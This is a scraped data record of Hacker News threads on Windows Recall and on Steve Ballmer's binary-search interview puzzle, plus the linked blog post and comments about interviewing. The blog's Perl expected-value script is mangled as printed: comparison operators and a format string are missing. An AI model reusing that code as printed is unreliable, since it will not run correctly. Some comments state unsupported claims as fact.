bongodongobob 15 hours agorootparentprevI'm sure there will be GPOs and registry keys to disable it. We're actually not worried about it at all, at least no one I know is. Corporate Windows deployments are not the same as Windows Home. We manage it very differently. reply x3n0ph3n3 14 hours agorootparentSo it's ok to have Skyward installed as long as it is disabled? reply zamadatix 6 hours agorootparentI don't think any enterprise is going to be shocked Windows has a few extra bytes of cruft than they need in the base install. Ultimately it actually being disabled is a matter of general trust in the data controls - for which Microsoft is a lot better favored on the enterprise side than the consumer side. reply grishka 15 hours agoprevIt is possible to uninstall any Windows component if you know which files contain it. And it's not like Windows would refuse to boot if Recall exe/dlls suddenly go missing. (this website is behind Cloudflare and blocks me unless I use a VPN) reply hashishen 15 hours agoparentI think the logic behind their statement lies in updates that reinstall the bloatware, as often is the case with Microsoft edge reply grishka 15 hours agorootparentYou can uninstall the updater too ¯\\_(ツ)_/¯ Just move its files (C:/windows/system32/wua*.dll) somewhere else. Put them back when/if you want to install updates, install updates, then move them again. reply RachelF 14 hours agorootparentIt's more complex than that now. For the last 4 years, Microsoft has a \"Medic Service\" that will put Windows update back if you just move those files. reply grishka 14 hours agorootparentThat service is also a file, iirc it's among those wua* ones. Everything is a file! reply tomrod 8 hours agorootparentI found a great file that allows me to install Linux! reply grishka 7 hours agorootparentThe only problem with that is that then you have to use Linux. reply poikroequ 14 hours agoparentprevI've noticed Windows is buggier when I disable certain features or tweak certain configurations. I'm not suggesting it's deliberate, but maybe just not well tested by Microsoft. For example, using the registry to disable copilot features, or disabling bing search in the start menu, are scenarios which are not going to be as well tested as the default configuration. So maybe windows will still boot after \"uninstalling\" recall, but it could have other consequences that make the operating system less stable. reply hnpolicestate 14 hours agoprevWill Microsoft sell your 'Recall' information to 3rd-parties? reply shiroiushi 14 hours agoparentThey should: they could make more profit that way. What are people going to do, stop using Windows? reply heavyset_go 12 hours agoparentprevThe data is the goldmine, they aren't going to share it, but they will use it to train models and target ads. reply wmf 14 hours agoparentprevNo, but nobody believes it. reply javcasas 8 hours agorootparent> Do you want to allow Microsoft to sell your data to third parties? > Yes > Ask me again in 30 minutes You haven't been paying attention to Windows lately, haven't you? reply yoyohello13 14 hours agorootparentprevThat’s because the real answer is “not right now” reply hnpolicestate 14 hours agorootparentprevMore people would believe it if TOS were legally binding. TOS are arbitrary no? reply sussmannbaka 12 hours agoparentprevThey are the third party. reply lionkor 11 hours agoprevWindows might be going the way of the Facebook - Billions of users but somehow only 3 people (out of many) I know use it. reply Aether_Well 15 hours agoprevIts an excellent feature to have for specialized malware to exploit. Government groups may already have developed their own of intelligence gathering. reply kazinator 14 hours agoprevHey kids, in regards to this, is your Gen-X dad trying to make some sort of joke about some \"Total Recall\" thing? reply Alifatisk 10 hours agoprevIf only there was an alternative to Windows, then I’d happily switch. Currently, Linux Mint seem like the closest alternative, but I wish there was a more modern ui DeepinOS had to best experience so far but there is something with it that makes me not want to fully transition to it, Idk what it is reply talles 14 hours agoprevMaybe they will main two Windows installation images, with and without? reply askvictor 14 hours agoparentUndoubtedly the EU will eventually require this reply Ylpertnodi 10 hours agorootparentSeveral years to implement (unless a 'save the children' clause can be inserted). Several more years of litigation. Tiny fine. Profit. reply reify 15 hours agoprevIn 2084, Mars is a colonized world under the tyrannical regime of Microsoft, who control the mining of valuable personal data. On Earth, construction worker Douglas Quaid experiences recurring dreams about Mars and a mysterious woman. Intrigued, he visits Rekall, a company that implants realistic false memories, and chooses one set on Mars (with a blue sky) where he is a Martian secret agent. reply sfjailbird 12 hours agoprevDoesn't this break EU law, by collecting personal information without consent, and without offering the option to have it removed? I would be surprised if this stands up in courts in the EU. reply arp242 12 hours agoparentIt's disabled by default. reply javcasas 8 hours agorootparentFor now. reply jeisc 12 hours agoprevafter 30 years how much data would it contain? they are out of control going over a cliff since Windows 95... reply deafpolygon 12 hours agoprevMy money is that Microsoft knows we're all heading to a remote work environment within the decade. This \"feature\" will be something employers will be clamoring for, so having it baked in ensures that enterprises continue to deploy Windows as the OS of choice. reply blackeyeblitzar 15 hours agoprevOf course not. Even though everyone tells me that all Microsoft software on top of the core operating system is actually installed using the same app installation framework that all third parties use, which definitely permits uninstalling. reply blackoil 14 hours agoprevCan it be disabled? reply kubb 15 hours agoprevIs this the enshittification everyone keeps talking about? reply shiroiushi 13 hours agoparentArguably, but I'm not sure. Usually, enshittification is when something starts out really good, but then the management tries to squeeze more \"value\" out of it by making it worse and worse in ways that make the company more profit, but makes the experience worse for the users. In the case of Windows, personally I don't remember it ever being \"really good\" in the first place; it's always been shitty, just in different ways. In the past, it wasn't shitty in this particular way, but it was shitty in other ways. They fixed some of the really shitty stuff (blue-screens all the time, bad vendor-provided drivers, etc.), but every time they fixed one shitty thing they added a new shitty thing. reply crabmusket 14 hours agoparentprevIf you squint? https://en.wikipedia.org/wiki/Enshittification > Here is how platforms die: first, they are good to their users; then they abuse their users to make things better for their business customers; finally, they abuse those business customers to claw back all the value for themselves. Then, they die. I call this enshittification, and it is a seemingly inevitable consequence arising from the combination of the ease of changing how a platform allocates value, combined with the nature of a \"two-sided market\", where a platform sits between buyers and sellers, hold each hostage to the other, raking off an ever-larger share of the value that passes between them. Windows doesn't quite fit that definition in the way that the term is usually applied to marketplace platforms like Facebook and Amazon. This is a misfeature but it doesn't feel like it's directly part of the intervention in the buyer-seller relationships Windows is mediating. reply hnpolicestate 14 hours agoparentprevIt's awful but not eshittification. Eshittification is suddenly waiting 40 minutes on a drive through because the restaurant refuses or can't hire more workers. reply houseplant 14 hours agoparentprevenshittification is the cute fun name for the concept of becoming a nigh-monopoly by buying out your competition with private equity and destroying it, and then- because the free market has effectively been destroyed- resting on your laurels for the forseeable future because there's no longer any pressure to improve or fix your product. you can basically let your product become garbage because any free market pressure, you know, the kind that capitalism purports to thrive on but actually seeks out to destroy, is gone. Why bother improving if there's nowhere else for your consumers to go? We're so used to using substandard products, getting substandard service, using things that are old, busted, falling apart, inappropriate for the job we're using them for, and so on... I love seeing westerners go to other countries and go \"whoa! they're living in the year 3000!\" reply pmontra 13 hours agoprev [–] China, Russia and many other countries will enthusiastically use Windows to send their secrets to cloud servers in the USA /s reply cynicalsecurity 12 hours agoparent [–] Russian army stopped using Windows many years ago. They switched to Linux. UK's ships with nuclear war heads are still using Windows XP. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Windows 11 users cannot uninstall Microsoft's \"Recall\" feature, which takes constant screenshots of user behavior for easy retrieval of previous work.",
      "A recent update mistakenly allowed Recall to be uninstalled, but Microsoft clarified this was a bug and is investigating privacy concerns.",
      "Due to public backlash and cybersecurity concerns, Microsoft made Recall opt-in and delayed its release to October for Windows Insiders testers."
    ],
    "commentSummary": [
      "Microsoft's 'Recall' feature, which cannot be uninstalled, has sparked user criticism and frustration over perceived complacency and dominance in the OS market.",
      "Concerns include privacy, telemetry, and the future of Windows, especially as younger generations prefer Chromebooks and iPhones.",
      "The debate centers on whether Microsoft's data-driven approach and AI integration will sustain its dominance or push users towards alternatives like Linux."
    ],
    "points": 186,
    "commentCount": 212,
    "retryCount": 0,
    "time": 1725331335
  },
  {
    "id": 41434637,
    "title": "Steve Ballmer's incorrect binary search interview question",
    "originLink": "https://blog.jgc.org/2024/09/steve-ballmers-binary-search-interview.html",
    "originBody": "John Graham-Cumming's blog 2024-09-03 Steve Ballmer's incorrect binary search interview question In this short video Steve Ballmer talks about a puzzle question he would ask candidates interviewing at Microsoft. Solving it is based on binary search and the expected value. Here's what he says: \"I'm thinking of a number between 1 and 100. You can guess, after each guess I'll tell you whether high or low. You get it the first guess I'll give you five bucks. Four bucks, three, two, one, zero, you pay me a buck, you pay me two, you pay me three\". The question is \"Should you accept to play this game?\". In the interview, Ballmer states that the answer is \"No\" for two reasons: firstly, because he can pick numbers that'll be the most difficult for you to determine, secondly because the expected value of the game (assuming Ballmer chooses randomly) is negative: you end up paying Ballmer. He's right on the first count. If you follow a binary search strategy (which will be optimal if he's choosing randomly) and he chooses one of 2, 5, 8, 11, 14, 17, 20, 22, 24, 27, 30, 33, 36, 39, 42, 45, 47, 49, 52, 55, 58, 61, 64, 67, 70, 72, 74, 77, 80, 83, 85, 87, 90, 93, 96, 98 or 100 then you owe him $1. For all other numbers you get $0 (if he chose 1, 4, 7, 10, 13, 16, 19, 23, 26, 29, 32, 35, 38, 41, 44, 48, 51, 54, 57, 60, 63, 66, 69, 73, 76, 79, 82, 86, 89, 92, 95 or 99) or a positive outcome (some of his money!). In the video above Ballmer chooses 59 which a binary search strategy would have found in 5 steps resulting in the interviewer, Emily Chang, winning $1. She was actually pretty close to doing that. The binary search steps would be 50, 75, 62, 56, 59 and she guessed 50, 75, 60, 55, 57, 58, 59. On the second count (Baller implies the expected value is negative), if he's choosing randomly, then he's wrong. The expected value is $0.20 (calculated discretely using the code below). The code calculates the number of guesses for each value and an overall expected value assuming Ballmer chooses randomly. use strict; use warnings; my @v = (0, 5, 4, 3, 2, 1, 0, -1, -2); my $ev = 0; my $ec = 0; my @range = (1..100); foreach my $r (@range) { my $l = $range[0]; my $h = $range[$#range]; my $s = 0; while (1) { $s += 1; my $g = int(($l + $h)/2); if ($r == $g) { print \"$r found in $s steps (\" . dollar($v[$s]) . \")\"; $ev += $v[$s]; $ec += 1; last; } if ($g$r) { $h = $g - 1; next; } } } $ev /= $ec; print \"Game expected value is \" . dollar($ev) . \"\"; sub dollar { my ($d) = @_; my $f = (int($d) == $d)?'%d':'%.2f'; return sprintf(\"%s\\$$f\", ($d<0)?':'', abs($d)); } This chart shows the expected winnings (or loss) depending on the number Ballmer chooses. The shape of the binary search can be seen in the chart itself. A different way to think about the expected value and binary search is as follows: 1. On the first guess you choose 50 and win $5 with a probability of 1/100 2. On the second guess you choose 25 or 75 and win $4 with a probability of 2/100 3. On the third guess you choose 12, 37, 62 or 88 and win $3 with a probability of 4/100 4. On the fourth guess you choose 6, 18, 31, 43, 56, 68, 81 or 94 and win $2 with a probability of 8/100 5. And so on. The gives the expected value as 5 * 1/100 + 4 * 2/100 + 3 * 4/100 + 2 * 8/100 + 1 * 16/100 + 0 * 32/100 + -1 * 37/100 (note the last term is the remaining possible numbers having reached the end of the binary search). That's 0.2. Why was Ballmer wrong? One possibility is that he didn't mean to have the $0 for 6 guesses. If he'd said \"I'm thinking of a number between 1 and 100. You can guess, after each guess I'll tell you whether high or low. You get it the first guess I'll give you five bucks. Four bucks, three, two, one, you pay me a buck, you pay me two, you pay me three\" then the expected value is -$0.49. at September 03, 2024 Email ThisBlogThis!Share to TwitterShare to FacebookShare to Pinterest Labels: mathematics, pseudo-randomness 5 comments: Damian Cugley said... Without bothering to think about it proper ,I wonder whether a different guessing algorithm do better, knowing which numbers he is likely to guess based on trying to get the highest payout? Like would an asymmetric binary chop? 1:14 PM Paul Hankin said... This comment has been removed by the author. 2:16 PM royalroad said... Your answer to the interview question is also wrong. What ballmer is describing is an incomplete information game of two players. The correct way to calculate the optimal expected value is by finding a nash equilibrium. 2:19 PM Paul Hankin said... This comment has been removed by the author. 2:23 PM espadrine said... Another (hopefully wrong) interpretation is that Ballmer implied he would change his secret number on the way, such that if using proper binary search, the Emily Chang attempt would have become: 50, 75, 62, 56, 59, 60, 61. If this is an adversarial game, this would be optimal play for him. I am not sure what else his remark that he can pick numbers that are hard to guess, means otherwise, in a Nashway equilibrium view. 4:38 PM Post a Comment Older Post Home Subscribe to: Post Comments (Atom) Labels pseudo-randomness hardware babbage anti-spam gnu make retro security codes and ciphers the geek atlas mathematics minitel behind the screens popfile privacy radio Popular Posts Steve Ballmer's incorrect binary search interview question In this short video Steve Ballmer talks about a puzzle question he would ask candidates interviewing at Microsoft. Solving it is based on b... Controlling the Taylor Swift Eras Tour wristbands with Flipper Zero Many large concerts feature wristbands that light up on command. They are used to produce varied visual effects across a stadium. One compan... Pimping my Casio with Oddly Specific Objects' alternate motherboard and firmware Some time ago I bought a replacement motherboard for my classic Casio F-91W from Crowd Supply. The project keeps the original Casio LCD but... The original WWW proposal is a Word for Macintosh 4.0 file from 1990, can we open it? The W3C has a page with the original WWW proposal from Tim Berners-Lee. One of the downloads says The original document file (I think - I ... My daily driver is older than I thought; it's positively vintage! I was doing some clean up on my main laptop and realized it had been a while since bought a new computer. Turns out it was a lot older than ... Your last name contains invalid characters My last name is \"Graham-Cumming\". But here's a typical form response when I enter it: Does the web site have any idea how rud... Two ways to use an LED as a light sensor with Arduino I needed to log when a light switched on and off during the night as part of debugging an oddly behaving movement sensor. To do that I built... \"Hacker News\" for retro computing and gaming I noticed over time that I was drawn to the retro computing or gaming posts on Hacker News . So, I've set up a dedicated web site in the... Acorn Computer Systems catalogue circa 1983 I unearthed a catalogue that I'd picked up in around 1983 of Acorn Computer Systems . This catalogue overlaps the BBC Micro era (which w... Complete restoration of an IBM \"Butterfly\" ThinkPad 701c Just over a year ago there was a discussion on Hacker News about the IBM ThinkPad 701c (the one with the lovely folding \"butterfly&quo... Blog Archive ▼ 2024 (12) ▼ September (1) Steve Ballmer's incorrect binary search interview ... ► June (3) ► May (1) ► April (1) ► March (3) ► February (2) ► January (1) ► 2023 (30) ► December (2) ► November (5) ► October (3) ► September (4) ► August (1) ► July (5) ► June (1) ► May (3) ► April (3) ► March (3) ► 2022 (24) ► December (2) ► November (3) ► October (8) ► September (1) ► July (2) ► June (2) ► April (2) ► March (4) ► 2021 (6) ► November (1) ► July (1) ► May (2) ► April (1) ► January (1) ► 2020 (2) ► June (2) ► 2018 (2) ► December (2) ► 2017 (4) ► May (1) ► April (3) ► 2016 (11) ► November (1) ► September (1) ► July (2) ► June (1) ► May (3) ► April (1) ► March (2) ► 2015 (11) ► November (1) ► July (2) ► May (1) ► April (5) ► March (1) ► January (1) ► 2014 (4) ► November (2) ► July (1) ► June (1) ► 2013 (39) ► September (4) ► August (1) ► July (4) ► June (2) ► May (5) ► April (12) ► March (3) ► February (2) ► January (6) ► 2012 (77) ► December (3) ► November (6) ► October (6) ► September (7) ► August (6) ► July (6) ► June (8) ► May (4) ► April (9) ► March (7) ► February (9) ► January (6) ► 2011 (79) ► December (5) ► November (7) ► October (2) ► September (5) ► August (2) ► July (8) ► June (10) ► May (6) ► April (9) ► March (6) ► February (12) ► January (7) ► 2010 (95) ► December (13) ► November (9) ► October (16) ► September (19) ► August (2) ► July (9) ► June (12) ► May (1) ► April (1) ► March (4) ► February (2) ► January (7) ► 2009 (31) ► December (1) ► November (8) ► October (3) ► September (6) ► August (9) ► June (1) ► May (1) ► January (2) ► 2008 (19) ► December (2) ► September (1) ► June (3) ► May (3) ► March (2) ► February (6) ► January (2) ► 2007 (34) ► December (2) ► November (3) ► October (5) ► August (2) ► July (2) ► June (4) ► May (3) ► April (1) ► March (6) ► February (4) ► January (2) ► 2006 (25) ► December (2) ► November (2) ► October (3) ► September (5) ► July (1) ► June (1) ► April (6) ► February (1) ► January (4) ► 2005 (3) ► December (1) ► November (2) Copyright (c) 1999-2024 John Graham-Cumming. Awesome Inc. theme. Powered by Blogger.",
    "commentLink": "https://news.ycombinator.com/item?id=41434637",
    "commentBody": "Steve Ballmer's incorrect binary search interview question (jgc.org)172 points by jgrahamc 5 hours agohidepastfavorite160 comments throwaway_1more 1 hour agoI recently interviewed for a senior level role for a complex domain (payments), this is an area I have more than a decade of experience. The interviews went flawlessly because I know payments inside out, not just in US but in UK and most EU jurisdictions. The funny bit is that the role being senior, influencing, soft communication skills and managing conflict are even more important than the subject matter expertise and I nailed those areas as well (they threw an obnoxious senior manager that kept interrupting me as I calmly answered the questions, the follow up was that my performance was a masterclass in handling conflict). The final round was with a business person who fancied himself the defacto subject matter expert and kept throwing trivia questions about payments. His plan was to go through as much trivia as he could until he could find something to justify a no. His last question (he literally stopped as soon as he got his way after this question), the question was, have you got personal experience working on real-time payments? I do, in more than one countries (US introduced this very recently as part of fednow), he pushed me about the fednow and obviously this is so new that I only have read the specifications and evaluated a few vendors to decide whether to build or buy. He used this as justification to make a negative reommendation, claiming I don't have real-time payments experience. Honestly, I don't want to work in an environment like that, it was a large US bank and where their biggest problems are not product innovation or focusing on customer but production failures! An area I have rescued several large companies in, apart from payments expertise and made sure I communicated this. But sometimes you get lucky and don't have to find out the hard way that this place is not pleasant. reply potamic 1 hour agoparent> they threw an obnoxious senior manager that kept interrupting me as I calmly answered the questions This is a red flag. To me this signals that a company not only has a toxic culture, but embraces it. Such places attract personalities who love conflict and once there are enough people, they set the culture. What doesn't get said often is that conflict is a failure of leadership. Often all it takes to resolve conflict is for one very senior leader to snap their fingers and say, \"Guys, I want you two to make this happen\". But what happens is that leadership is either far too disconnected from the ground to align their teams, or they constitutionally advocate conflict within their teams in the name of competitiveness. Either way, such places can be hell to work in. reply cjblomqvist 18 minutes agorootparentPersonally, I don't like this kind of thinking that it's a failure of leadership first and foremost. Yes, of course leadership can both work proactively to prevent conflict, as well as try to minimize/react to situations. But, what about the conflicting people? Shouldn't they (in most situations), bear the most responsibility to not end up/turn a situation into a conflict? Sometimes I get afraid of comments that (in my interpretation) imply that basically everything bad that happens is the fault of leadership (management). To me that breeds a culture where ICs are taught to not own their situation, which I believe is very very dangerous (to everyone involved). Maybe I'm just interpreting your comment wrong :) reply AmericanChopper 1 hour agoparentprevThat SME guy sounds like an asshole, but I used to have an interview technique where I’d ask increasingly specific and low level questions about the candidates area of expertise until it got to the point where I’d be pretty confident they wouldn’t know the answer off the top of their head. I wasn’t adversarial or rude about it, I just wanted to find out if they were comfortable saying “I don’t know”, because not knowing something is an everyday part of technical work, but not being comfortable saying it can be big source of issues. The candidates who were otherwise the most competent tended to be the most comfortable with the I don’t know answer. Getting defensive about it I always considered to be a red flag. reply rocketbop 1 hour agorootparentI always say I don’t know in interviews when I really don’t, rather than try to bluff. Some interviewers don’t like this though. As with the parent, perhaps that’s actually a good thing as you avoid having to work in a bad environment. Other times though, you may be being interviewed with a bad egg who you’ll never actually need to work with in the actual job. reply AmericanChopper 38 minutes agorootparentYeah this is basically how I see it, there’s a natural selection to it. If you practice deceit and politicking in interviews (and in the office), you’ll select yourself into, and only be able to succeed in organisations that value those things. If you practice honesty and candor in interviews, then you’ll expect the same (over time at least). In interviews I think you should just be guided by your genuine values and be yourself (well, whatever version of yourself you feel most comfortable bringing to the office every day). It probably doesn’t maximise job offer conversions, but in my experience it maximises being in working environments that I’m most likely to enjoy and fit into well. Edit: By honesty in interviews, I mean to a point. There’s some things you absolutely should lie about in interviews (if you’re confident you can get away with it). For instance “what’s your current salary” is a great question to lie about, that they really have no business asking anyway. reply kstrauser 16 minutes agorootparentprevI've been on the other side of that table. The interviewer stated in advance that the questions would get harder until I couldn't answer anymore, and that's OK because he wanted to see where my knowledge stopped. That clarity made it much more fun than stressful. I felt alright saying \"I think the answer is X, but it could possibly be Y, and here's what the different implications would be\". But for the luvagod, please state that up front. It wouldn't have been nearly so fun, or informational for the interviewer, if I'd felt like I was failing a quiz. reply actsasbuffoon 4 minutes agorootparentI like that idea, and I may need to steal it. I have this tendency of asking candidates questions, and if I feel like they’re demonstrating very strong knowledge then I may toss them a few extremely obscure questions for bonus points, but I never expect candidates to get them right. But this up-front approach of setting expectations seems like a better way to go. reply giancarlostoro 6 minutes agorootparentprev> because not knowing something is an everyday part of technical work, but not being comfortable saying it can be big source of issues. I'm honestly never afraid to say those words, if someone doesn't want to hire me because I said it, I dodged a bullet. I'll go where the devs and leads are sensible people. reply zerr 7 minutes agorootparentprevRemember that you are talking to humans, they are flexible. You were being adversarial. If you could explain them in advance what you were trying to \"read between lines\", I'm pretty sure most/all of them would have changed their answers. So what you were supposing that was unfixable/permanent, apparently is fixable within 1 minute (of explanation). reply citizenpaul 43 minutes agorootparentprevI have the same idea in interviews. they need to be able to admit when they don't know or need help depending on the level. However I thought about it and I think the continuous \"why\" comes off as sort of childish or low effort. I didn't want to drive off people that reasonably didn't want to work in a place with a toxic culture. My solution was to ask a question that was specific to the workplace but technical so that it would require more information to solve. I looked for answers along the lines of: - I don't know - I don't have enough information based on the question - I would do it this way generally but this question requires employer specific information. Not someone that just barreled forward and came up with a defacto answer as the solution. They had to give some sort of admission that they could not really solve the problem as is. reply kgla 1 hour agorootparentprevThey don't know what the interviewer wants to hear. There are places where every admission of not knowing something is held against you. reply recursive 49 minutes agorootparentIf the employer would hold that against you, it's not a place I'd want to work. Not sure about you. reply kibwen 5 hours agoprevThe article implies that the interviewee assumes that the number is being chosen randomly, when Ballmer could actually be choosing adversarially. However, if the interviewee assumes that Ballmer is being adversarial, then you can pick a different value as your initial guess, which causes the probabilities to shift. Even the OP assumes that the interviewee will start guessing with 50, but, because of the way binary search works, you can select an initial guess that is offset from 50 (with a randomized offset each time) to defeat trivial adversarial attacks that attempt to game the heuristic, while still mostly reaping the benefits of binary search. I'd be interested to see someone do the analysis of what the optimal random-offset-selection algorithm would be to counter trivial adversarial choices. reply baking 5 minutes agoparentYou have 31 positive payout guesses (1 $5, 2 $4, 4 $3, 8 $2 and 16 $1) leaving 69 other numbers with zero or negative payouts. You don't want to have gaps larger than three between your positive guesses, but there are 32 gaps for a total of 96 possibilities, or an excess of 27 over the numbers you need to cover. It seems like a lot of possibilities and I think you can get away with a minimum gap size of one, but let's assume you do 5 3-gaps at 1, 25, 50, 75, and 100 and 2-gaps everywhere else. So start with 51, then 26 and 76. Then go up or down 12, then 6, then 3. If you have a gap of two you flip a coin, if a gap of three you pick the middle one. Or if you have them write down the number and you think it has double-digits you could put your 4-gaps below 20. Start with 53 and go up or down 24, 12, 6, and 3 (unless it is below 20, then it is multiples of four.) 59 would pay you a dollar. Your starting guess could be anywhere from 37 to 64 without paying out more than a dollar, but if you start with an extreme, then low odd numbers and high even numbers will have a negative payout. However, I think you can still randomize sufficiently starting with 38 and 63, e.g. 63-31-15-7-3-1. reply mrgoldenbrown 4 hours agoparentprevIt would not be shocking to find out a cocky interviewer posed a brainteaser while leaving out a fundamental assumption, then judged an answer as incorrect because it violated that unspoken assumption - I can imagine Ballmer saying \"no actually, you have to start with a guess of 50, everyone knows that.\" reply tasty_freeze 3 hours agorootparentI worked with a guy like this. He told me this story to impress me with how incisive he is. Instead it told me he is an egomaniac. His story went something like this, I don't recall the exact details: \"I was interviewing a candidate who said he had experience programming on an IBM/370. So I asked him if you perform a character edit format instruction in EBCDIC mode with the leading zero specifier and the numeric value is too great to fit into the allocated field, after the instruction completes, what is the state of the program status word overflow field?\" Then trounced the guy for not knowing. The thing is the guy asking the question happened to have worked on that instruction when he worked at Amdahl. One thing to know is the IBM 360 and descendant family had a commercial instruction set option that, in a single instruction, could take a format value and generate a string output that followed some format specification, kind of like sprintf but with even more options. reply jareklupinski 2 hours agorootparent> if you perform a character edit format instruction in EBCDIC mode with the leading zero specifier and the numeric value is too great to fit into the allocated field, after the instruction completes, what is the state of the program status word overflow field? \"Is the computer operating on American electricity, or European?\" reply cbsmith 2 hours agorootparentAfrican or European. Everyone knows that. reply pdonis 50 minutes agorootparentAfrican and European electricity could be operating it together... reply jb3689 1 hour agorootparentprevAh, the B type developer. Knows enough to find exciting and interesting problems but doesn’t know how to distinctly separate a type C (who can’t solve the problem at all) from a type A ( who knows the problem in and out and knows “it depends”). Not all that different to me from midlevel dev who learns about concurrency/metaprogramming/etc and starts using it as a tool for everything. Just enough to be dangerous. reply itronitron 18 minutes agorootparentThey like to pretend their asking high level system design questions while actually quizzing candidates on esoteric low-level details. reply enneff 4 hours agorootparentprevUnless the interviewer has totally lost sight of the purpose of the interview, they’d recognise a candidate starting at an offset from 50 as an instant pass. reply ozim 4 hours agorootparentWhat was the last time you were on the interview? I think like 70% of interviews I ever had were like they were there to prove how smart they are and how stupid I am. I suppose most likely to make me feel stupid and accept lowball offer. reply NickC25 3 hours agorootparentOne of the worst interviews I ever had was just like that. Often times, the \"gotcha\" part is just dumb and nonsensical, yet gives the interviewer(s) a sense of misguided (false) superiority, and wastes everyone's time. I would venture to say that 99% of the time it's complete un-indicative of how effective the candidate would be in the role. Referring to my aforementioned bad interview - the question, after all the technical stuff had been cleared (this was for a junior frontend dev role) - they asked \"imagine a car is broken and not running. how would you go about figuring out how to fix it?\". Being someone whose brother and father enjoyed fixing cars, I asked every question about the problem with the car - how it was used, what sort of car it was, what the issue with the car was, what prior problems the car had, etc. I got a bunch of useless answers. After I exhausted all my questions, the interviewers told me I had failed. Why? One interview brought out a tiny hotwheels car with a missing wheel out of his pocket, and proclaimed to say \"you didn't ask if it was a real car, it's a toy car, of fucking course it's not supposed to run like a real car!\" while laughing hysterically. How on earth does that indicate if a junior frontend dev can do their job or not? Stupid. reply moritonal 3 hours agorootparentGreat interview from a certain perspective. You knew for sure (if you had a choice) that you didn't want to work for this specific person. reply crazygringo 2 hours agorootparentprevI had an interview at a major tech company with a similar thing, for a more managerial role. The question was to estimate how many vacuum cleaners there were in the city we were in. Fine, I did some estimation of how many vacuum cleaners per household and per office, across how many households and offices. Standard stuff. Then the guy starts laughing and saying I'd failed because I didn't include discarded vacuum cleaners in landfills. Or the vacuum suction devices they put in your mouth at the dentist's office. And so forth. And then had to spend the next five minutes listening to him \"teach me\" how not to make assumptions. So I acted all polite and tried to fake \"oh gosh thank you so much for enlightening me!\" Shockingly, I got the job, which required unanimous approval from all interviewers. Never met him again, and to this day I still have no idea whether this was supposed to be a test of estimation (which was easy to pass), a test of not making assumptions (which is dumb, but OK fine I failed), or a test of being appropriately professional and smiling in the face of complete bullshit (which I'd say I passed with flying colors). I mean, in my professional life I've certainly had my fair share of customers and managers and coworkers who spout bullshit and you really do just have to lie with a smile and say \"oh my gosh you're so right thank you for explaining that, I appreciate you so much!\" Where you need to make them feel smart. On the other hand, I just don't think he was thinking that far ahead. reply mgkimsal 2 hours agorootparentIs the landfill actually 'in' the city, or in a rural area outside the city limits? I had a similar interview years ago - something like \"how many windows are there on houses in our town?\". Wasn't quite that, but I asked up front if \"houses\" meant just physical standalone houses, or if they meant living spaces, including apartments/dorms, etc. I got clarification, gave some estimate with some reasoning, and was then told I was the only person of the 8 they'd interviewed that had asked any clarifying question at all, which apparently impressed them enough to make an offer. reply extr 45 minutes agorootparentYes, I have used questions like this before for junior roles and the notes for the interview were something like: - Asked/did not ask clarifying questions - Did/did not (or could not, on prompting) verbally walk through their reasoning - Could/could not articulate which assumptions they felt were most important/why Nothing about the actual content of the question itself, or if your answer was approximately correct (I usually did not know even the ballpark of the correct answer myself). I will say I did sometimes write down if candidates make comically bad assumptions. Like assuming the population of the USA was 1 Billion people. It's a fine line on what is \"comically bad\" but like, if you are interviewing for a startup of 20 people and you use $20B/year as the revenue assumption with no wink. That's a red flag. Lmao. reply amarcheschi 3 hours agorootparentprevThat just feels like playing chess with a pigeon reply dllthomas 3 hours agorootparentprev> How on earth does that indicate if a junior frontend dev can do their job or not? Playing devil's advocate, maybe a junior frontend dev that doesn't trust that they understand what someone is asking for and pushes back on bits that should be obvious will perform better (in some contexts?) than one that doesn't. For a junior role in particular, though, it really doesn't seem like that should be the threshold and it sounds like it was delivered poorly on top of that. reply JackFr 2 hours agorootparentMight be good as an exercise in a workshop on requirements gathering, as part of an interview absolutely stupid. reply enneff 2 hours agorootparentprevIt’s been a long long time since I was interviewed for a job, but I have conducted a lot of interviews since then and any signal that the candidate has engaged with the question and has interesting thoughts about it is a huge plus. FWIW I would never ask these kinds of gotcha questions. I just give simple programming problems and talk through solutions with the candidates, and then throw in complications to the questions to make them more interesting and test more areas of the candidates knowledge and problem solving abilities. Yknow, like what happens on the job every day. reply ozim 1 hour agorootparentGood for you, as you look for someone to work with, not someone to cut down their offer. I am basically doing the same as I also interview people - but I also check the market from time to time as I am not company owner. But I basically don't care about the offer if company pays guy much or not it is not my money and I only win if I get a smart, nice person who knows his job to work with. reply EricE 3 hours agorootparentprevIt goes both ways - one interview turned into an acronym gotcha session. I quickly figured out that was not a place I would want to work; another friend that ended up working their later confirmed my suspicions. reply jliptzin 2 hours agorootparentprevYea, they’re pointless. The amount of time someone spends on a truly difficult and important problem is maybe 0.1% of their job. And usually it’s better to just call in a domain expert anyway if it’s something that important. The other 99.9% - do they show up on time and work hard, do they care about the company, do they fit in with the rest of the team, etc, mostly can’t be determined in a short interview anyway. reply HarryHirsch 4 hours agorootparentprevLike this one: https://rachelbythebay.com/w/2011/07/27/ohreally/ Yes, that happens, and elsewhere she goes on about culture in tech. reply rpdillon 2 hours agorootparentI strongly agree with the sibling comment that this is a perfectly valid interview question. One of the biggest red flags in an interview is if I ask a question and the person doesn't know how to say 'I don't know', because it suggests there's a big risk that if I assign them a task in their day-to-day work, they won't tell me if they feel unprepared to tackle it. That's a far bigger issue than not knowing that traceroute uses variable TTLs to figure out the timing along the route. reply wisemang 3 hours agorootparentprevI don’t doubt this happens but seems like a poor example. She effectively rooted out a bullshitter. No worries if you don’t know how a tool works, but just say I don’t know. That answer was nonsensical. reply HarryHirsch 3 hours agorootparentThe purpose of an interview is not to root out a bullshitter but to find someone you can work with. If that guy doesn't know about TCP/IP, move on to the next topic. If the guy has poor attitude, be polite. Just don't waste time with making fun of the candidate, it does not reflect well on interviewer and company. For what we know, the guy may well have been employing \"test-taking strategies\", and he may have been led down the garden path by the interviewer. There's far too many posts in Rachel's blog where she goes on about \"the one\", who knows much better already, and here she channels the asshat that she complains about when she encounters him at work. reply treatmesubj 3 hours agorootparentprevIs the guy's response really that far off? Each router checks its table for the destination, and if it doesn't know it, queries the next upstream router, its default route, the next hop. Each router likely ultimately informs you of the hand-off via a packet of some sort, and your then traceroute sends a ping/ICMP to each hop to learn how far away they are. He maybe could've been pushed to expand on what he did know in more detail, but it seems like she just threw out SNMP as misleading bait, and he maybe mixed up ICMP and SNMP. She is right to call herself a troll, but wow, that's crazy to say she caught the guy in a lie of insanity. reply stickfigure 1 hour agorootparentThe stepwise increasing TTL is the fundamental mechanism that makes traceroute work. Any answer 